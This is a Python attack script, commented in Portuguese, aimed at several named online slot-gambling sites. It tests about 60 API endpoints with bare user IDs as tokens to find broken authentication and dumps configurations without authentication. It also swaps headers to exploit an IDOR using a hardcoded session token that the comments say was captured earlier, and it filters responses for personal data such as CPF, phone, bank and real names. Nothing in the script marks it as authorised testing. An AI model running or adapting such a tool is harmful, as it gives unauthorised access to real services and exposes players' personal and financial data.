"""
tool_tenant_sweep.py
====================
Varredura completa de todos os tenants com todos os vetores.
Inclui:
  A. Token anão em 40+ endpoints de todos os tenants
  B. Config dump sem auth em todos os tenants
  C. Novos endpoints descobertos via DNS/CT logs
  D. Verificação do lucky777 com UIDs diferentes
  E. ccgamevip — Nbcx/Xutc swap
  F. Endpoints de perfil que podem vazar PII
  G. Recharge via token anão no body
"""
import ssl, urllib.request, urllib.error, json, time
from datetime import datetime, timezone

ctx = ssl.create_default_context()
ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE

RESULTS = []
THROTTLE = 0.6

def req(method, url, body=None, token=None, headers=None):
    h = {"User-Agent":"Mozilla/5.0","Accept":"application/json, */*"}
    if body is not None: h["Content-Type"] = "application/json"
    if token is not None: h["Token"] = str(token)
    if headers: h.update(headers)
    data = json.dumps(body).encode() if body is not None else None
    try:
        r = urllib.request.Request(url, data=data, headers=h, method=method)
        with urllib.request.urlopen(r, timeout=8, context=ctx) as resp:
            raw = resp.read(16384).decode("utf-8","ignore")
            try: return resp.status, dict(resp.headers), json.loads(raw)
            except: return resp.status, dict(resp.headers), {"_raw": raw[:500]}
    except urllib.error.HTTPError as e:
        raw = e.read(8192).decode("utf-8","ignore") if e.fp else ""
        try: return e.code, {}, json.loads(raw)
        except: return e.code, {}, {"_raw": raw[:300]}
    except Exception as ex:
        return 0, {}, {"err": str(ex)}

def record(tenant, cat, path, token_val, code, data, extra=""):
    sev = "info"
    if code == 200 and data is not None:
        sensitive = []
        if isinstance(data, dict):
            sensitive = [k for k in data if any(s in k.lower() for s in
                         ("phone","email","cpf","bank","real_name","id_number",
                          "client_ip","password","account","withdraw"))]
        sev = "critical" if sensitive else "high"
        data_str = json.dumps(data, ensure_ascii=False)[:300]
        icon = "🔴" if sev=="critical" else "🟠"
        print(f"  {icon} [{tenant}] {path} Token={token_val!r}")
        print(f"    data={data_str}")
        if sensitive:
            print(f"    🔴 PII: {sensitive}")
    RESULTS.append({"tenant":tenant,"cat":cat,"path":path,"token":str(token_val),
                    "code":code,"data":data,"severity":sev,"extra":extra})

# ─── Tenants ──────────────────────────────────────────────────

TENANTS = [
    ("amizade777",   "ds.amizade777.com"),
    ("rainha777",    "ds.rainha777slots.com"),
    ("aphrodite777", "ds.aphrodite777.com"),
    ("lucky777_mx",  "ds.lucky777.mx"),
    ("ccgamevip",    "hus3wyear.ccgamevip.com"),
]

# Endpoints pra testar com token anão
JAPI_ENDPOINTS = [
    # Saldo/financeiro
    ("GET",  "/japi/user/balance/querySimpleBalance"),
    ("GET",  "/japi/user/balance/queryBalance"),
    ("GET",  "/japi/user/balance/queryUserBalance"),
    # Perfil
    ("GET",  "/japi/user/info"),
    ("GET",  "/japi/user/profile"),
    ("GET",  "/japi/user/getUserInfo"),
    ("POST", "/japi/user/getUserInfo"),
    ("GET",  "/japi/user/me"),
    ("GET",  "/japi/user/detail"),
    ("GET",  "/japi/user/realName"),
    ("GET",  "/japi/user/idCard"),
    # Extra info
    ("GET",  "/japi/user/getExtraInfo"),
    ("GET",  "/japi/user/getDama"),
    # VIP
    ("GET",  "/japi/user/vip/info"),
    ("GET",  "/japi/user/vip/getAllDisplayVo"),
    ("GET",  "/japi/user/vip/level"),
    # Sign-in
    ("GET",  "/japi/user/api/signIn/customerSignConfig"),
    ("POST", "/japi/user/api/signIn/v2/signIn"),
    ("GET",  "/japi/user/api/signIn/signRecord"),
    # Convite
    ("GET",  "/japi/invite/boxConfig/boxReceiveRecord"),
    ("POST", "/japi/invite/boxConfig/boxInfo"),
    ("POST", "/japi/invite/userInvite/getInviteConfig"),
    ("POST", "/japi/invite/userInvite/getRewardRecordList"),
    ("POST", "/japi/invite/userInvite/queryInviteRewardData"),
    ("POST", "/japi/invite/userInvite/queryInviteDayReportData"),
    # Atividades
    ("POST", "/japi/activity/redPacketRain/currentRedPacketRainActivityList"),
    ("POST", "/japi/activity/redPacketRain/getRedPacket"),
    # Wallet
    ("GET",  "/japi/user/wallet"),
    # Game
    ("POST", "/japi/user/game/getGameList"),
    # Bank
    ("GET",  "/japi/user/bank"),
    ("GET",  "/japi/user/bankList"),
    # Message
    ("GET",  "/japi/user/message/list"),
    ("POST", "/japi/user/message/list"),
    ("GET",  "/japi/user/notice/list"),
    # Coupon
    ("GET",  "/japi/user/coupon/list"),
    # Report
    ("GET",  "/japi/user/report/daily"),
    ("GET",  "/japi/user/statistics"),
    ("POST", "/japi/user/statistics"),
    # Security
    ("GET",  "/japi/user/security"),
    ("GET",  "/japi/user/twoFactor"),
    # Admin (PA proxy)
    ("GET",  "/prod-api/invite/admin/invite/getUserInviteList"),
    ("GET",  "/prod-api/invite/admin/invite/getInviteConfig"),
    ("GET",  "/prod-api/invite/admin/invite/getRewardRecordList"),
]

PROD_ENDPOINTS = [
    # Player/info
    ("POST", "/prod-api/player/info"),
    ("GET",  "/prod-api/player/info"),
    # Bank
    ("GET",  "/prod-api/pay-service/bank"),
    # Listas financeiras
    ("GET",  "/prod-api/pay-service/recharge-list"),
    ("GET",  "/prod-api/payment/balance-less/list"),
    # Config
    ("POST", "/prod-api/set/get"),
    ("POST", "/prod-api/set/mains"),
    ("GET",  "/prod-api/global-config/recharge"),
    # VIP
    ("POST", "/prod-api/vip/info"),
    ("GET",  "/prod-api/vip/info"),
    # Letters
    ("POST", "/prod-api/letters/list"),
    ("POST", "/prod-api/mail/getMailCount"),
    # Notice
    ("POST", "/prod-api/notice/list"),
    # Game history
    ("POST", "/prod-api/playGame/queryUserGameRecord"),
]

body_default = {"appPackageName":"com.slots.big","appVersion":"1.0.0","appChannel":"pc"}
uids_to_test = [1, 137027]

# ─── A. Varredura de token anão em todos os tenants ──────────

print("=" * 60)
print("A. VARREDURA TOKEN ANÃO — TODOS OS TENANTS")
print("=" * 60)

for tenant_name, host in TENANTS:
    print(f"\n  [{tenant_name}] {host}")
    base = f"https://{host}"
    accessible = 0

    for method, path in JAPI_ENDPOINTS + PROD_ENDPOINTS:
        for uid in uids_to_test:
            body = body_default.copy() if method == "POST" else None
            st, _, b = req(method, base+path, body, token=uid,
                           headers={"Origin":base,"Referer":base+"/"})
            code = b.get("code") if isinstance(b,dict) else None
            data = b.get("data") if isinstance(b,dict) else None

            # Sentinel test (uid inválido)
            st2, _, b2 = req(method, base+path, body, token="zzz",
                             headers={"Origin":base,"Referer":base+"/"})
            code2 = b2.get("code") if isinstance(b2,dict) else None

            # Vulnerável: uid aceito, zzz rejeitado
            if code == 200 and code2 != 200:
                accessible += 1
                record(tenant_name, "dwarf_token", path, uid, code, data)
            elif code == 200 and code2 == 200:
                # Público (sem auth)
                record(tenant_name, "public_endpoint", path, "public", code, data,
                       "Endpoint público (sem auth)")
            time.sleep(THROTTLE)

    print(f"    {accessible} endpoints vulneráveis ao token anão")

# ─── B. Config dump em todos os tenants ──────────────────────

print("\n" + "=" * 60)
print("B. CONFIG DUMP SEM AUTH — TODOS OS TENANTS")
print("=" * 60)

for tenant_name, host in TENANTS:
    base = f"https://{host}"
    st, _, b = req("POST", base+"/prod-api/set/get", body_default,
                   headers={"Origin":base})
    code = b.get("code") if isinstance(b,dict) else None
    if code == 200:
        d = b.get("data") or {}
        summary = {k: d.get(k) for k in
                   ("withdraw_min","ip_user_limit","device_user_limit",
                    "recharge_amount_max","withdraw_pay_rate") if k in d}
        ipw = (d.get("ab_condition") or {}).get("ipWhites")
        print(f"  ✅ [{tenant_name}] Config dump sem auth!")
        print(f"    ipWhites={ipw} summary={summary}")
        record(tenant_name, "config_dump", "/prod-api/set/get", "no_auth", code,
               {"summary":summary,"ipWhites":ipw})
    else:
        print(f"  ❌ [{tenant_name}] code={code}")
    time.sleep(THROTTLE)

# ─── C. lucky777 — UIDs diferentes ───────────────────────────

print("\n" + "=" * 60)
print("C. LUCKY777 — TESTA UIDS E PATHS DIFERENTES")
print("=" * 60)

LUCKY = "https://ds.lucky777.mx"
for uid in [1, 10, 100, 1000, 10000]:
    st, _, b = req("GET", LUCKY+"/japi/user/balance/querySimpleBalance",
                   token=uid, headers={"Origin":LUCKY})
    code = b.get("code") if isinstance(b,dict) else None
    data = b.get("data") if isinstance(b,dict) else None
    print(f"  uid={uid}: code={code} data={data}")
    if code == 200:
        record("lucky777", "dwarf_token", "/japi/user/balance/querySimpleBalance",
               uid, code, data)
    time.sleep(0.5)

# Testa outros endpoints no lucky777
for method, path in JAPI_ENDPOINTS[:10]:
    body = body_default if method=="POST" else None
    st, _, b = req(method, LUCKY+path, body, token=1, headers={"Origin":LUCKY})
    code = b.get("code") if isinstance(b,dict) else None
    if code == 200 and b.get("data") is not None:
        record("lucky777", "dwarf_other", path, 1, code, b.get("data"))
    time.sleep(0.4)

# ─── D. ccgamevip — Nbcx/Xutc swap ──────────────────────────

print("\n" + "=" * 60)
print("D. CCGAMEVIP — NBCX / XUTC SWAP")
print("=" * 60)

CCGAME = "https://hus3wyear.ccgamevip.com"
# Token do aphrodite (capturado em sessão anterior)
APH_TOKEN = "207587:1781026736:3001:3d1022d4885108c66afee70e43c58ebc"

for nbcx_uid in [207587, 137027, 137028, 1]:
    for xutc in ["aphrodite777", "amizade777", "rainha777slots"]:
        st, _, b = req("GET",
                       CCGAME+"/prod-api/year/api/yearRechargeReward",
                       token=APH_TOKEN,
                       headers={
                           "Nbcx": str(nbcx_uid),
                           "Xutc": xutc,
                           "Origin": f"https://ds.{xutc}.com"
                       })
        code = b.get("code") if isinstance(b,dict) else None
        data = b.get("data") if isinstance(b,dict) else None
        if code == 200 and data:
            returned_uid = data.get("userId") if isinstance(data,dict) else None
            idor = returned_uid != nbcx_uid
            print(f"  Nbcx={nbcx_uid} Xutc={xutc}: code={code} "
                  f"userId={returned_uid} {'🔴 IDOR!' if idor else '✅'}")
            record("ccgamevip", "nbcx_swap", "/yearRechargeReward",
                   f"Nbcx={nbcx_uid}", code, data,
                   f"Xutc={xutc} IDOR={idor}")
        time.sleep(0.4)

# ─── E. Aphrodite — player/info e bank info ──────────────────

print("\n" + "=" * 60)
print("E. APHRODITE — PLAYER/INFO E BANK/INFO VIA TOKEN ANÃO")
print("=" * 60)

APH = "https://ds.aphrodite777.com"

for uid in [1, 207587]:
    # player/info com token no body (padrão descoberto)
    st, _, b = req("POST", APH+"/prod-api/player/info",
                   {"token": str(uid), "appPackageName":"com.slots.big"},
                   headers={"Origin":APH})
    code = b.get("code") if isinstance(b,dict) else None
    data = b.get("data") if isinstance(b,dict) else None
    print(f"  Aphrodite player/info body_token={uid}: code={code}")
    if code == 200 and data:
        ui = data.get("user_info") or data
        pii = {k:v for k,v in ui.items() if any(s in k.lower() for s in
               ("phone","email","cpf","bank","real_name","ip"))}
        print(f"    PII: {pii}")
        record("aphrodite777", "player_info_body", "/prod-api/player/info",
               uid, code, ui, f"PII={bool(pii)}")

    # bank
    st2, _, b2 = req("GET", APH+"/prod-api/pay-service/bank",
                     token=uid, headers={"Origin":APH})
    code2 = b2.get("code") if isinstance(b2,dict) else None
    data2 = b2.get("data") if isinstance(b2,dict) else None
    if code2 == 200 and data2:
        print(f"  Aphrodite bank uid={uid}: code={code2} data={data2}")
        record("aphrodite777", "bank_info", "/prod-api/pay-service/bank",
               uid, code2, data2)
    time.sleep(0.5)

# ─── Salvar ───────────────────────────────────────────────────

with open("tenant_sweep_resultados.json","w",encoding="utf-8") as f:
    json.dump(RESULTS, f, ensure_ascii=False, indent=2, default=str)

# Resumo
from collections import Counter
sev_count = Counter(e["severity"] for e in RESULTS)
vuln_by_tenant = Counter(e["tenant"] for e in RESULTS if e["severity"] in ("critical","high"))

print(f"\n{'='*60}")
print(f"TENANT SWEEP — RESUMO")
print(f"  Total: {len(RESULTS)} registros")
print(f"  Por severidade: {dict(sev_count)}")
print(f"  Vulneráveis por tenant: {dict(vuln_by_tenant)}")

crits = [e for e in RESULTS if e["severity"] == "critical"]
if crits:
    print(f"\n  🔴 {len(crits)} ACHADOS CRÍTICOS:")
    for e in crits:
        print(f"    [{e['tenant']}] {e['path']} token={e['token']}")
        print(f"    data={json.dumps(e['data'], ensure_ascii=False)[:200]}")

print(f"\n✅ tenant_sweep_resultados.json")
